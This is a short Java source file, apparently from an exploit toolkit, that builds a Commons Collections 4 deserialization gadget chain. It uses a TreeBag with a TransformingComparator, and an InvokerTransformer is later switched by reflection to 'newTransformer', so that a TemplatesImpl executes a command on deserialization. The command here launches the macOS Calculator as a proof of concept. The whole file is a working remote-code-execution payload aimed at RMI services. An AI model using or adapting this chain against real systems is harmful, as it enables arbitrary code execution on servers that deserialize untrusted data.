package com.threedr3am.bug.rmi;

import com.threedr3am.bug.common.utils.Reflections;
import com.threedr3am.bug.rmi.utils.Gadgets;
import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

/**
 * @author threedr3am
 */
public class CommonCollections4 {

  public static Object getPayload() throws Exception {
    Object templates = Gadgets.createTemplatesImpl("/System/Applications/Calculator.app/Contents/MacOS/Calculator");

    // setup harmless chain
    final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

    // define the comparator used for sorting
    TransformingComparator comp = new TransformingComparator(transformer);

    // prepare CommonsCollections object entry point
    TreeBag tree = new TreeBag(comp);
    tree.add(templates);

    // arm transformer
    Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");

    return tree;
  }

}
